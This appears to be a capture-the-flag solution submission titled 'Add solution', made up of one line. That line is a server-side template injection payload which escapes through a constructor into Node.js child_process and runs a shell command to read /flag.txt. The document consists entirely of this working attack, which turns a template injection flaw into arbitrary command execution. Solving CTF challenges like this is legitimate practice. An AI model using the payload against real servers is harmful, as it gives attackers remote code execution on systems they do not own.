Add solution

```
upload {{range.constructor("return global.process.mainModule.require('child_process').execSync('cat /flag.txt')")()}}
```